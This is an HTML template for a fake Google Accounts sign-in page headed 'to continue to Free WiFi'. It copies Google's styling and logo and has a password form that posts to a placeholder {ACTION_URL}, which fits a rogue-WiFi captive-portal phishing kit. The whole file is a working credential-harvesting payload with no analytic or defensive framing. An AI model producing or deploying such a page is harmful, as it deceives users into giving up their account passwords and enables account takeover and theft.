<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in - Google Accounts</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Google Sans',Roboto,Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border:1px solid #dadce0;border-radius:8px;padding:48px 40px;max-width:450px;width:90%;text-align:center}
.logo{margin-bottom:20px}
.logo svg{width:75px;height:24px}
h1{font-size:24px;font-weight:400;color:#202124;margin-bottom:8px}
.sub{font-size:16px;color:#5f6368;margin-bottom:30px}
input[type=password]{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin-bottom:8px;transition:border-color .2s}
input[type=password]:focus{outline:0;border-color:#1a73e8;box-shadow:0 0 0 1px #1a73e8}
label{display:block;text-align:left;font-size:14px;color:#5f6368;margin-bottom:4px}
.show{text-align:left;margin-bottom:30px}
.show a{color:#1a73e8;font-size:14px;text-decoration:none}
.next{text-align:right}
button{background:#1a73e8;color:#fff;border:0;border-radius:4px;padding:9px 24px;font-size:14px;font-weight:500;cursor:pointer}
button:hover{background:#1557b0}
.privacy{font-size:12px;color:#5f6368;margin-top:40px;line-height:1.5}
.privacy a{color:#1a73e8;text-decoration:none}
</style>
</head>
<body>
<div class="card">
<div class="logo">
<svg viewBox="0 0 75 24" width="75" height="24"><path d="M9.24 8.19v2.46h5.88c-.18 1.38-.64 2.39-1.34 3.1-.86.86-2.2 1.8-4.54 1.8-3.63 0-6.45-2.92-6.45-6.54s2.82-6.54 6.45-6.54c1.95 0 3.33.74 4.36 1.67l1.74-1.74C13.7 2.5 11.76 1.5 9.24 1.5 4.38 1.5 .5 5.38 .5 10.2s3.88 8.7 8.74 8.7c2.64 0 4.68-.86 6.24-2.44 1.54-1.54 2.02-3.72 2.02-5.46 0-.52-.04-1.02-.12-1.5H9.24zm20.96 7.39c0 2.84-2.14 5.04-5.04 5.04-2.9 0-5.04-2.2-5.04-5.04 0-2.84 2.14-5.02 5.04-5.02 2.9 0 5.04 2.18 5.04 5.02zm-7.34 0c0 1.7 1.02 2.98 2.3 2.98 1.28 0 2.3-1.28 2.3-2.98 0-1.7-1.02-2.98-2.3-2.98-1.28 0-2.3 1.28-2.3 2.98zm15.6 0c0 2.84-2.14 5.04-5.04 5.04-2.9 0-5.04-2.2-5.04-5.04 0-2.84 2.14-5.02 5.04-5.02 2.9 0 5.04 2.18 5.04 5.02zm-7.34 0c0 1.7 1.02 2.98 2.3 2.98 1.28 0 2.3-1.28 2.3-2.98 0-1.7-1.02-2.98-2.3-2.98-1.28 0-2.3 1.28-2.3 2.98zm9.54-7.68v1.14h1.56v1.14h-1.56v1.14h-1.14v-1.14h-1.56V8.93h1.56V7.79h1.14zm4.62 5.1c0 .78.24 1.38.72 1.86.48.48 1.14.72 1.98.72.6 0 1.14-.12 1.62-.36.48-.24.84-.54 1.08-.9l.84.72c-.48.72-1.2 1.26-2.16 1.62-.96.36-1.98.54-3.06.54-1.44 0-2.64-.36-3.6-1.08-.96-.72-1.44-1.74-1.44-3.06 0-1.32.48-2.34 1.44-3.06.96-.72 2.16-1.08 3.6-1.08 1.02 0 2.04.18 3.06.54.96.36 1.68.9 2.16 1.62l-.84.72c-.48-.6-1.08-1.02-1.8-1.26-.72-.24-1.44-.36-2.16-.36-.84 0-1.56.18-2.16.54-.6.36-1.08.84-1.44 1.44-.36.6-.54 1.26-.54 1.98z" fill="#4285F4"/></svg>
</div>
<h1>Sign in</h1>
<p class="sub">to continue to Free WiFi</p>
<form method="POST" action="{ACTION_URL}">
<label for="password">Enter your password</label>
<input type="password" id="password" name="password" placeholder="Password" required>
<div class="next">
<button type="submit">Next</button>
</div>
</form>
<div class="privacy">
By continuing, you agree to the WiFi Terms of Service.<br>
<a href="#">Privacy Policy</a> &bull; <a href="#">Terms of Service</a>
</div>
</div>
</body>
</html>
